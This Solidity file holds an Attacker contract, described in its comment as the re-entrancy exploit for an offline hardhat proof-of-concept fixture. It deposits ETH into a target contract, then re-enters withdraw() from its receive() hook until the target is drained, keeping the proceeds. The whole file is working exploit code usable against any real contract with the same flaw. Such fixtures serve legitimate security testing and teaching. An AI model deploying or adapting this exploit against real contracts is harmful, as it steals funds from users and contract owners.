// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVuln {
    function deposit() external payable;
    function withdraw() external;
}

// Attacker — the re-entrancy exploit contract for the offline hardhat-poc fixture (#1507). It deposits once,
// then re-enters Vuln.withdraw() from its receive() hook until Vuln is drained, keeping the stolen ETH.
contract Attacker {
    IVuln public immutable target;

    constructor(address _target) {
        target = IVuln(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw();
        }
    }
}
